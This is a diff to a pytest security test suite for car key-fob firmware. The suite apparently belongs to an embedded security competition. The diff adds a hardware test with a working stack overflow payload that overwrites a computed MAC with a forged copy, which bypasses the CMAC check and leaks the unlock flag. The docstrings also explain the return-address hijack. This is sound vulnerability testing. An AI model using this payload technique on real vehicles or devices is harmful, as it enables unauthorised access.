@@ -1,10 +1,11 @@
 import math
+import shutil
 import statistics
 import time
 import pytest
 import struct
 from collections import Counter
-from conftest import RoleConfig
+from conftest import RoleConfig, build_binary
 import protocol as proto
 import secrets
 import json
@@ -13,6 +14,7 @@ import os
 from tqdm import trange, tqdm
 
 from package import create_feature_package, FeaturePackage
+from overflow_offsets import derive_mac_overwrite_offsets
 
 from cryptography.hazmat.primitives import cmac
 from cryptography.hazmat.primitives.ciphers import algorithms
@@ -122,6 +124,92 @@ class TestSimpleReplayAttacks:
 
         assert proto.is_locked(car_b), "Cross-car attack should NOT succeed"
 
+FLAG_SIZE = 64  # see application/include/platform.h
+
+
+def _require_arm_toolchain():
+    """Skip (not fail) when the ARM cross toolchain isn't available: this
+    repo's default test run (no --using) never reaches here (sim doesn't
+    need it), but test_full_mac_bypass_blind's MAC-gap derivation needs it
+    to disassemble a real ELF."""
+    if shutil.which("arm-none-eabi-gcc") is None or shutil.which("arm-none-eabi-objdump") is None:
+        pytest.skip("arm-none-eabi-gcc/objdump not found on PATH - needed to build and disassemble "
+                     "firmware for the MAC-gap derivation")
+
+
+def _craft_mac_bypass_payload(mac_gap: int, mac_len: int = 8, forged_mac: bytes = None) -> bytes:
+    """Payload for the adjacent-local MAC-bypass bug (see
+    overflow_offsets.derive_mac_overwrite_offsets): exactly mac_gap + mac_len
+    bytes, laid out as
+
+        [ forged_mac (mac_len) | junk (mac_gap - mac_len) | forged_mac (mac_len) ]
+
+    The first copy lands in received_mac itself - whatever the attacker
+    wants "their" MAC to look like. The junk in between falls on whatever
+    else the compiler placed between received_mac and computed_mac in this
+    build (unlockCar()'s nonce[16] - already consumed by the time this
+    receive happens, so clobbering it has no effect). The second copy of
+    forged_mac lands exactly on computed_mac's first mac_len bytes,
+    overwriting the real CMAC result with a byte-for-byte copy of
+    received_mac right before the comparison runs - so the check passes for
+    whatever forged_mac was chosen, without ever knowing the real CMAC key.
+
+    forged_mac defaults to mac_len zero bytes - any mac_len-byte value works
+    identically, since both sides of the comparison end up holding the same
+    forged copy."""
+    if forged_mac is None:
+        forged_mac = b"\x00" * mac_len
+    assert len(forged_mac) == mac_len, f"forged_mac must be exactly mac_len={mac_len} bytes, got {len(forged_mac)}"
+    junk_len = mac_gap - mac_len
+    assert junk_len >= 0, (
+        f"mac_gap ({mac_gap}) is smaller than mac_len ({mac_len}) - forged_mac itself would "
+        f"already overlap computed_mac, so there's no separate 'junk' region to fill"
+    )
+    return forged_mac + b"A" * junk_len + forged_mac
+
+
+def _prep_mac_bypass_test(deploy, hardware_config, car_id: str):
+    """Shared test_full_mac_bypass_blind setup: derive the real MAC-gap from
+    a compiled ELF, build the real bypass payload, deploy a production car +
+    its paired fob, and sanity-check the pair (a real, legitimately-
+    credentialed unlock) before the forged one. Returns (elf, payload, car,
+    fob)."""
+    elf = build_binary(RoleConfig("car", id=car_id, test=False), hardware_config.board)
+    mac_offsets = derive_mac_overwrite_offsets(elf)
+    assert mac_offsets.reachable, (
+        f"mac_gap={mac_offsets.mac_gap} isn't reachable via a uint8_t message_len - can't "
+        f"build a payload that reaches computed_mac"
+    )
+    payload = _craft_mac_bypass_payload(mac_offsets.mac_gap, mac_offsets.mac_len)
+    print(f"[{hardware_config.board}] id={car_id}: mac_gap={mac_offsets.mac_gap}, "
+          f"mac_len={mac_offsets.mac_len}, payload_len={len(payload)}")
+
+    car, fob = deploy(
+        RoleConfig("car", id=car_id, test=False),
+        RoleConfig("paired_fob", id=car_id, pin="123456"),
+    )
+    assert proto.cmd_btn_press(fob, timeout=5.0).success, "Sanity check failed before test"
+    car.serial.reset_input_buffer()  # drop the sanity check's own flag output,
+                                      # so the capture below is only this test's
+
+    return elf, payload, car, fob
+
+
+def _assert_mac_bypass_flag_exfiltrated(car, elf: Path, wait: float = 1.5) -> None:
+    """Read car.serial for the real unlock flag - confirms the forged
+    RESPONSE_MAGIC was accepted exactly as a legitimate one would have been."""
+    time.sleep(wait)
+    captured = car.serial.read(300)
+    print(f"Captured {len(captured)} bytes over HOST_UART: {captured!r}")
+
+    unlock_flag = (elf.parent / "flags.bin").read_bytes()[3 * FLAG_SIZE:4 * FLAG_SIZE].split(b"\x00", 1)[0]
+    assert unlock_flag, "Couldn't read the expected unlock flag out of flags.bin"
+    assert unlock_flag in captured, (
+        f"Expected the real unlock flag ({unlock_flag!r}) to be exfiltrated over HOST_UART via "
+        f"the forged MAC, but it wasn't found in {captured!r}"
+    )
+
+
 @pytest.mark.car1
 @pytest.mark.car2
 @pytest.mark.car3
@@ -141,14 +229,14 @@ class TestUnlockBufferOverflow:
     unlockCar()'s saved registers and return address. On real Cortex-M
     hardware (no stack protector in this build - see SConstruct, no
     -fstack-protector* flag anywhere in the ARM build config) this is full
-    control-flow hijack; see testing/test_stack_overflow_poc.py for a working
-    proof-of-concept that turns it into arbitrary code execution and flag
-    exfiltration on real STM32 hardware. Here on sim, gcc's own stack
-    protector (glibc canary between the locals and the saved return address)
-    independently catches the corruption and aborts the process - so this
-    test demonstrates the underlying bug (an oversized message_len reaches
-    and corrupts the return address) via that crash, without needing to
-    reproduce the RCE mechanism itself."""
+    control-flow hijack - see test_full_mac_bypass_blind below for a working
+    exploit of the same missing-bounds-check class of bug against a
+    different, adjacent pair of stack locals (received_mac/computed_mac).
+    Here on sim, gcc's own stack protector (glibc canary between the locals
+    and the saved return address) independently catches the corruption and
+    aborts the process - so this test demonstrates the underlying bug (an
+    oversized message_len reaches and corrupts the return address) via that
+    crash, without needing to reproduce an RCE mechanism itself."""
 
     def test_oversized_unlock_message_crashes_car(self, car_and_paired_fob):
         # Deliberately a *paired* fob, not unpaired, even though pairing state
@@ -195,6 +283,48 @@ class TestUnlockBufferOverflow:
             "it to have crashed (unbounded uart_read() into a fixed stack buffer, "
             "corrupting the saved return address / stack canary)."
         )
+
+    @pytest.mark.hardware_only
+    def test_full_mac_bypass_blind(self, deploy, hardware_config):
+        """The same missing bounds check as test_oversized_unlock_message_crashes_car
+        above, but read via the RESPONSE_MAGIC receive that fills
+        unlockCar()'s received_mac[8] rather than the UNLOCK_MAGIC receive
+        that fills buffer[64] - and a much more dangerous consequence than a
+        crash. received_mac[8] and computed_mac[16] are both plain stack
+        locals with nothing enforcing a gap between them, so a RESPONSE_MAGIC
+        sized to reach exactly that far overwrites computed_mac with a copy
+        of whatever the attacker put in received_mac - and the
+        memcmp(computed_mac, received_mac, 8) that follows degenerates into
+        "does this buffer equal the copy of itself an attacker just wrote",
+        true for any forged value, no CMAC key needed.
+
+        No crash, no control-flow hijack, no reentry address, no shellcode:
+        just the real, blind, wire-delivered attack straight through -
+        forging a RESPONSE_MAGIC gets treated as a matching MAC, and the car
+        proceeds exactly as it would for a legitimate fob and exfiltrates the
+        real unlock flag over HOST_UART.
+
+        hardware_only: sim's own stack layout doesn't necessarily reproduce
+        this exact adjacent-local overwrite, and the MAC-gap derivation
+        (overflow_offsets.derive_mac_overwrite_offsets) needs a real compiled
+        ELF to disassemble."""
+        _require_arm_toolchain()
+
+        elf, payload, car, fob = _prep_mac_bypass_test(deploy, hardware_config, "990001")
+
+        # A normal (non-oversized) UNLOCK_MAGIC first, so unlockCar() runs
+        # its real challenge-response setup and computes a real computed_mac
+        # from a real nonce - this attack doesn't need to control that value,
+        # only to overwrite it after the fact. Then the crafted RESPONSE_MAGIC
+        # in place of a real challenge-response answer. The 0.15s gap is a
+        # real-hardware margin: unlockCar()'s nonce generation loops on
+        # ctr_drbg_generate()/getPrngSeed() and can reseed from real ADC
+        # entropy sampling if a draw fails.
+        proto.cmd_send_board_msg(fob, proto.UNLOCK_MAGIC, b"")
+        time.sleep(0.15)
+        proto.cmd_send_board_msg(fob, proto.RESPONSE_MAGIC, payload)
+
+        _assert_mac_bypass_flag_exfiltrated(car, elf)
 
 @pytest.mark.car2
 class TestComplexReplayAttacks:
